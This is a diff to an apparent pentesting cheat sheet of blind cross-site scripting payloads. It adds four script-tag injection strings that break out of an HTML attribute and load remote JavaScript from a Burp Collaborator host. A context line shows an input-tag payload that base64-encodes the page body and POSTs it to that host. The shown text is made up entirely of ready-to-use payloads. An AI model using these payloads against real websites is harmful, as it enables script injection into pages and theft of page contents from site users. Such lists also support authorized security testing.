@@ -40,3 +40,13 @@ The following list includes some blind XSS payloads that can be used to proof ev
 ```html
 <input onfocus='fetch("https://example.burpcollaborator.net/imput-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})' autofocus>
 ```
+
+## Script-Tag
+```html
+'"><script src=https://example.burpcollaborator.net/script-tag></script>
+
+'"><script type="text/javascript" src="https://example.burpcollaborator.net/script-tag-type"></script>
+
+'"><script type="module" src="https://example.burpcollaborator.net/script-tag-module"></script>
+'"><script nomodule src="https://example.burpcollaborator.net/script-tag-nomodule"></script>
+```
